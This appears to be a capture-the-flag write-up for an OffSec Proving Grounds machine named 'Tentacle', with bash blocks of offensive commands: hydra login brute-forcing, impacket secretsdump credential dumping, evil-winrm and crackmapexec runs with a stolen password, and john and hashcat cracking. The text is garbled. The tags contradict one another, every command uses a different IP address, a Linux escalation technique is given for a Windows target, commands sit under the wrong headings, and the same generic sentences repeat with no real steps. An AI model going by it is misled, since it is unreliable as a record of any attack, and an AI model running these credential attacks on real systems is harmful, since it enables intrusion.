---
TitleSEO: "OffSec Proving Grounds — Tentacle (Medium Windows) | ZureFX"
TitlePost: "OffSec Proving Grounds — Tentacle (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Tentacle. LXD Privilege Escalation and Kerberoasting to achieve medium compromise on Windows."
Keywords: "reversing, easy, pwntilldawn"
URL: "https://zurefx.github.io/writeups/htb-tentacle-937.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-tentacle-937/"
Date: "2024-02-28"
Tags: "Reversing, Easy, PwnTillDawn"
Section: "writeups"
Lang: "en"
main_img: "htb-tentacle-937"
Permalink: "/writeups/htb-tentacle-937.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Tentacle** is rated **Medium** on OffSec Proving Grounds. It runs **Windows** and the IP address during this analysis was `10.98.102.221`.

### Objectives

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.31.169.223
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities.

### Service Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.17.207 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.247.82 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.120.37.157 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.42.97.221 -u administrator -p 'P@ssw0rd!'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities.

### SMB Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.76.182.183/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.90.65.188 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files.

## Exploitation

### Vulnerability Identification

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

Key finding: **LXD Privilege Escalation**.

The target system was identified as running a vulnerable version of the service. Command injection was possible through unsanitized user input in the search functionality.

### Initial Access

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.40.77.203/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI).

## Privilege Escalation

### Enumeration

The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
nmap -sCV -p110,22,8888 10.102.127.251 -oN scan.txt
```

### Exploitation

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
gobuster dir -u http://10.27.231.164/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Summary

### Tools Used

- `secretsdump`
- `mimikatz`
- `atexec`
- `john`
- `smbclient`

### Key Takeaways

- LXD Privilege Escalation
- Kerberoasting
- AlwaysInstallElevated
